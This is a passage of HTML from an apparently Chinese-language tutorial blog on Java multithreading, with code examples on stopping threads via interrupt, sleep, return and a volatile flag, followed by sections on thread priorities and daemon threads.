operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                    <span class="token keyword">if</span> <span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"已经是停止状态了"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">throw</span> <span class="token keyword">new</span> <span class="token class-name">InterruptedException</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//                    break;</span>                    <span class="token punctuation">}</span>                    System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"current thread name   "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"   i = "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">}</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"真的停止了吗？假的"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//抛出异常，会将中断位重新置为false</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"interrupted exception "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span><span class="token punctuation">,</span> <span class="token string">"AA"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        t<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  thread 是否终止 "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>t<span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"  thread 是否终止 "</span> <span class="token operator">+</span> t<span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/FDE10EE6-7A27-4153-983C-C2F97958A4C4.png" alt="6062118701b0f2cf673413e7284d2a88"></p><h4 id="先sleep后interrupt，在沉睡中终止"><a href="#先sleep后interrupt，在沉睡中终止" class="headerlink" title="先sleep后interrupt，在沉睡中终止"></a>先sleep后interrupt，在沉睡中终止</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStop001</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"run begin"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"run end"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"在沉睡中被停止  + "</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Run</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">try</span> <span class="token punctuation">{</span>            ThreadStop001 t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadStop001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            t<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//抛出异常，会将中断位重新置为false</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"先sleep,后interrupt，进入catch main catch"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/25CC59DE-20B4-4C43-8BE0-C5F10537B3BA.png" alt="7b5a993d456c7cc530a774524053db47"></p><h4 id="先interrupt，后sleep"><a href="#先interrupt，后sleep" class="headerlink" title="先interrupt，后sleep"></a>先interrupt，后sleep</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStop001</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">500000</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"current thread name   "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"   i = "</span> <span class="token operator">+</span> <span class="token punctuation">(</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">200000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"真的停止了吗？假的"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">//抛出异常，会将中断位重新置为false</span>            <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"先停止，遇到sleep,进入catch。interrupted exception "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Run</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        ThreadStop001 t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadStop001</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/4136676E-49AC-44B3-800E-46E3938CF2DD.png" alt="7390a82233623faafc01fb116ec2b0b7"></p><h4 id="使用inturrupt和return停止线程"><a href="#使用inturrupt和return停止线程" class="headerlink" title="使用inturrupt和return停止线程"></a>使用inturrupt和return停止线程</h4><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadStop002</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>    <span class="token annotation punctuation">@Override</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token boolean">true</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"停止了 ！！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">return</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"timer = "</span> <span class="token operator">+</span> System<span class="token punctuation">.</span><span class="token function">currentTimeMillis</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        ThreadStop002 t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ThreadStop002</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">2000</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/7F94C3E7-4995-449C-9162-E74776E2AF08.png" alt="b904262bb1ea9e0f1980965ae6f95c25"></p><p>不使用return，也可以这样。</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadEnd</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">UseThread</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isInterrupted</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"   is run "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        UseThread t <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">UseThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t<span class="token punctuation">.</span><span class="token function">interrupt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="使用设立标志位中断线程"><a href="#使用设立标志位中断线程" class="headerlink" title="使用设立标志位中断线程"></a>使用设立标志位中断线程</h4><p>利用volatile的可见性</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">package</span> com<span class="token punctuation">.</span>lendea<span class="token punctuation">.</span>juc<span class="token punctuation">.</span>c_0001<span class="token punctuation">;</span><span class="token keyword">import</span> java<span class="token punctuation">.</span>util<span class="token punctuation">.</span>concurrent<span class="token punctuation">.</span>TimeUnit<span class="token punctuation">;</span><span class="token comment" spellcheck="true">/** * @author lwy * @version V1.0 * @Description: 使用标志位中断线程，httpclient连接池 * @date 2020/8/31 10:00 下午 */</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">InterruptThread02</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        Thread01 t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread01</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">try</span> <span class="token punctuation">{</span>            Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span>TimeUnit<span class="token punctuation">.</span>SECONDS<span class="token punctuation">.</span><span class="token function">toMillis</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span><span class="token class-name">InterruptedException</span> e<span class="token punctuation">)</span> <span class="token punctuation">{</span>            e<span class="token punctuation">.</span><span class="token function">printStackTrace</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        t1<span class="token punctuation">.</span>flag <span class="token operator">=</span> Boolean<span class="token punctuation">.</span>FALSE<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">private</span> <span class="token keyword">static</span> <span class="token keyword">class</span> <span class="token class-name">Thread01</span> <span class="token keyword">extends</span> <span class="token class-name">Thread</span> <span class="token punctuation">{</span>        <span class="token keyword">private</span> <span class="token keyword">volatile</span> <span class="token keyword">boolean</span> flag <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>        <span class="token annotation punctuation">@Override</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">run</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">int</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>            <span class="token keyword">while</span> <span class="token punctuation">(</span>flag<span class="token punctuation">)</span> <span class="token punctuation">{</span>                System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>n<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="线程的优先级"><a href="#线程的优先级" class="headerlink" title="线程的优先级"></a>线程的优先级</h2><p><strong>定义</strong><br>在操作系统中，线程区分优先级，优先级较高的线程获得的CPU资源更多。也就是CPU优先执行优先级较高线程的任务</p><p>设置线程有助于帮助“线程规划器”确定在下一次选择哪一个线程来确定执行</p><p><strong>方法：</strong><br>setPriority()方法</p><p>线程优先级分为1-10这十个优先级，要是超过这个范围，会抛出illeagalArgumentException异常<br>缺省为5，但线程的优先级不可靠，不建议作为线程开发时候的手段</p><p>JDK中预置了三个线程优先级</p><pre class="line-numbers language-java"><code class="language-java">    <span class="token comment" spellcheck="true">/**     * The minimum priority that a thread can have.     */</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> MIN_PRIORITY <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>   <span class="token comment" spellcheck="true">/**     * The default priority that is assigned to a thread.     */</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> NORM_PRIORITY <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span>    <span class="token comment" spellcheck="true">/**     * The maximum priority that a thread can have.     */</span>    <span class="token keyword">public</span> <span class="token keyword">final</span> <span class="token keyword">static</span> <span class="token keyword">int</span> MAX_PRIORITY <span class="token operator">=</span> <span class="token number">10</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>线程优先级的特性</strong></p><p><strong>1. 线程优先级的继承特性</strong><br>A线程启动B线程，则B线程和A线程的优先级一致</p><pre class="line-numbers language-java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">ThreadPriority</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token keyword">throws</span> InterruptedException <span class="token punctuation">{</span>        Thread t1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"current thread priority is "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main thread priority "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t1<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">500</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">setPriority</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"main thread priority "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        Thread t2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Thread</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">{</span>            System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getName</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">"current thread priority is "</span> <span class="token operator">+</span> Thread<span class="token punctuation">.</span><span class="token function">currentThread</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">getPriority</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        t2<span class="token punctuation">.</span><span class="token function">start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>运行结果<br><img src="java%E5%A4%9A%E7%BA%BF%E7%A8%8B%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5.resources/CC05D125-C4D0-4AB7-A09C-CFB40304F623.png" alt="575923735ce9487147a36d42777167eb"></p><p><strong>2. 优先级具有规则性</strong><br><strong>3. 优先级具有随机性</strong><br>高优先级的线程并不会全部执行完后，才会曲折性低优先级的。只是整体优先等级高，优先完成的概率高</p><h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><p>守护线程：为其他线程服务的线程。</p><p><strong>分类</strong><br>线程分两种，一种是自定义线程，一种是守护线程。守护线程起到一个保姆的作用，java中典型的守护线程是垃圾回收线程。也就是GC(垃圾回收器)。</p><p>setDeamon(boolean on):标记一个线程是否属于守护线程</p><p>注意：</p><ul><li><p>守护线程和主线程共死，finally不能保证一定执行；</p></li><li><p>所有非守护线程都执行完毕后，无论是否有守护线程，虚拟机都会退出；</p></li><li><p>守护线程不能持有需要关闭的资源（如打开文件等）；</p><pre class="line-numbers language-java"><code class="language-java"><span class="token comment" spellcheck="true">/*** @author lwy* @version V1.0* @Description: 守护线程* @date 2020/8/31 10:40 下午*/</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token 